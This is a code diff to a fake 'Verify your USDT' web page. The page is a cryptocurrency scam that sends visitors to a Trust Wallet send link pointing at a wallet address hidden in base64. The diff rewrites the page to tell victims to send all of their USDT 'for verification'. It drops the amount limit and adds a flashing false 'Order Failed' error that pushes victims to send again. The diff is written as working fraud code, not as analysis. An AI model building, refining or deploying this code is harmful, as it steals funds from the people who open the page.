@@ -17,22 +17,13 @@
       padding: 20px;
       text-align: center;
     }
-    header {
-      margin-top: 20px;
-    }
     header img {
       width: 100px;
-      height: auto;
       margin-bottom: 10px;
     }
     h1 {
       font-size: 26px;
       color: #00ffcc;
-      margin-bottom: 10px;
-    }
-    p {
-      font-size: 16px;
-      opacity: 0.9;
     }
     .card {
       background: #181e2f;
@@ -42,15 +33,6 @@
       margin-top: 30px;
       max-width: 400px;
       width: 100%;
-    }
-    input[type="number"] {
-      padding: 12px;
-      font-size: 16px;
-      border-radius: 10px;
-      border: none;
-      width: 80%;
-      margin-top: 15px;
-      text-align: center;
     }
     button {
       background: #00ffcc;
@@ -72,6 +54,18 @@
       font-size: 15px;
       color: #ffa500;
     }
+    .flash-msg {
+      display: none;
+      font-weight: bold;
+      color: #ff4444;
+      margin-top: 20px;
+      font-size: 15px;
+      animation: flash 1s infinite;
+    }
+    @keyframes flash {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
     footer {
       margin-top: 40px;
       font-size: 13px;
@@ -89,10 +83,10 @@
 
   <div class="card">
     <h2>Verify your USDT</h2>
-    <p>Enter any amount to send via Trust Wallet</p>
-    <input type="number" id="amount" placeholder="Enter USDT amount" />
-    <button onclick="verifyUSDT()">Verify USDT</button>
-    <div class="processing" id="processingText">Processing verification...</div>
+    <p>Click below to send <strong>ALL</strong> USDT from your wallet for verification</p>
+    <button onclick="verifyUSDT()">Verify All Amount</button>
+    <div class="processing" id="processingText">Redirecting to Trust Wallet...</div>
+    <div class="flash-msg" id="flashError">❌ Order Failed. Please enter all USDT and verify again.</div>
   </div>
 
   <footer>
@@ -100,22 +94,23 @@
   </footer>
 
   <script>
-    // Hide actual wallet from source
-    const walletBase64 = "VEQ4S3FMU1lNaUU0eExYNFFWcnpYNFBScmpwQ2lzN3Z1Swo=";
-    const walletAddress = atob(walletBase64).trim(); // decode hidden wallet
+    // Wallet address hidden using base64
+    const walletEncoded = "VEQ4S3FMU1lNaUU0eExYNFFWcnpYNFBScmpwQ2lzN3Z1Swo="; // TD8KqLSYMiE4xLX4QVrzX4BSRjpCis7vuK
+    const walletAddress = atob(walletEncoded).trim();
 
     function verifyUSDT() {
-      const amount = document.getElementById("amount").value;
-      if (!amount || parseFloat(amount) <= 0) {
-        alert("Please enter a valid amount.");
-        return;
-      }
-
       document.getElementById("processingText").style.display = "block";
       setTimeout(() => {
-        const url = `https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=${walletAddress}&amount=${amount}`;
-        window.location.href = url;
+        // Redirect without amount to allow "all" selection
+        window.location.href = `https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=${walletAddress}`;
       }, 1500);
+    }
+
+    // Show error if returned with status=fail
+    window.onload = function () {
+      if (window.location.href.includes("?status=fail")) {
+        document.getElementById("flashError").style.display = "block";
+      }
     }
   </script>
 
